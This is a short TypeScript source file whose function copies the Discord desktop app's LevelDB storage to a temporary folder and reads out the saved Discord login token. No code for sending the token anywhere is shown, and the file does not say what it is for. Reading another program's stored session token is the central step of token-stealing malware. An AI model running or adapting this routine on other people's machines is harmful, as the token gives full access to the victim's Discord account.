import { Level } from 'level';
import { DISCORD_LEVELDB_PATH, DISCORD_TMP_PREFIX, DISCORD_TOKEN_KEY } from './constants';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

export async function getDiscordRawToken() {
	const tmpPath = await fs.mkdtemp(path.join(os.tmpdir(), DISCORD_TMP_PREFIX));

	let db: Level | undefined;
	try {
		await copyFolder(DISCORD_LEVELDB_PATH, tmpPath);

		db = new Level(tmpPath);
		await db.open();
		const token = await db.get(DISCORD_TOKEN_KEY);
		if (!token) throw new Error('Token not found');
		return token.replace(/"/g, '').slice(1);
	} finally {
		await db?.close();
		await fs.rm(tmpPath, { recursive: true });
	}
}

async function copyFolder(fromPath: string, toPath: string) {
	await fs.mkdir(toPath, { recursive: true });
	const files = await fs.readdir(fromPath);
	for (const file of files) {
		const from = `${fromPath}/${file}`;
		const to = `${toPath}/${file}`;
		const stats = await fs.stat(from);
		if (stats.isDirectory()) {
			await copyFolder(from, to);
		} else {
			await fs.copyFile(from, to);
		}
	}
}
